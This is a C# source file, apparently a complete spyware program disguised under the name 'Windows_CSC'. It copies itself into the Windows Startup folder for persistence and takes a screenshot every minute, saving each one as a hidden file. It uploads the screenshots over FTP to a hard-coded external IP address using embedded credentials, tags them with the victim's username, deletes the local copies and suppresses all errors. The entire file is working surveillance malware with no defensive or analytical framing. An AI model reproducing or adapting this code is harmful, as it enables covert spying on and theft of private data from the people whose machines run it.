using System;
using System.Drawing;
using System.Windows.Forms;
using System.Net;
using System.Reflection;
using System.Threading;

namespace Windows_CSC
{
    class Program
    {
        static string path = System.Environment.GetFolderPath(System.Environment.SpecialFolder.UserProfile) + "\\AppData\\Roaming\\";
        static void Main(string[] args)
        {
            Thread[] back = new Thread[1];
            CopyAutoload();
            back[0] = new Thread(Send);
            back[0].Start();
        }
        static Bitmap ScreenImage()
        {
            Bitmap bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, System.Drawing.Imaging.PixelFormat.Format24bppRgb);
            Graphics gr = Graphics.FromImage(bmp);
            gr.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);
            return bmp;
        }
        static void Send()
        {
            while (true)
            {
                string today = DateTime.Now.ToString("yyyy-MM-d-HH-mm-ss");
                ScreenImage().Save(path + today + ".jpg");
                System.IO.File.SetAttributes(path + today + ".jpg", System.IO.FileAttributes.Hidden);
                try
                {
                    using (var client = new WebClient())
                    {
                        client.Credentials = new NetworkCredential("u0951712", "ywCXB!58");
                        client.UploadFile("ftp://37.140.192.54/screen/" + Environment.UserName + today + ".jpg", WebRequestMethods.Ftp.UploadFile, path + today + ".jpg");
                    }
                }
                catch
                {

                }                
                System.IO.File.Delete(path + today + ".jpg");
                Thread.Sleep(60000);
            }
           
        }
        static void CopyAutoload()
        {
            try
            {
                if (!System.IO.File.Exists(path + "Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + Application.ProductName + ".exe"))
                {
                    System.IO.File.Copy(Assembly.GetExecutingAssembly().Location, path + "Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + Application.ProductName + ".exe");
                }
            }
            catch
            {
            }
        }
    }
}
